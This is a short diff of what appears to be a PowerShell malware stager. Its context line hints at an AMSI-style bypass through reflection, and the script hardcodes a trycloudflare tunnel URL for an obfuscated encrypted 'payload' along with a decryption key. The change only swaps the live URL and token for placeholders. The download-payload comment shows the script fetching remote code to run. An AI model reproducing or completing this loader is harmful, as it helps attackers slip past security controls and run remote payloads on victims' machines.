@@ -26,7 +26,7 @@ try{[Reflection.Assembly]::LoadWithPartialName('System.Core')|Out-Null;$a=[Ref].
 [Net.ServicePointManager]::SecurityProtocol='Tls12'
 
 # Hardcoded URLs
-$u='https://dale-recently-shed-cup.trycloudflare.com/payloads/i5_obf_encrypted.txt?key=2cf7cbeab9fd5a21'
+$u='https://CHANGE-MECHANGE-ME.trycloudflare.com/payloads/i5_obf_encrypted.txt?key=PLACEHOLDER_TOKEN'
 $k='MySecretKey2025'
 
 # Download encrypted payload
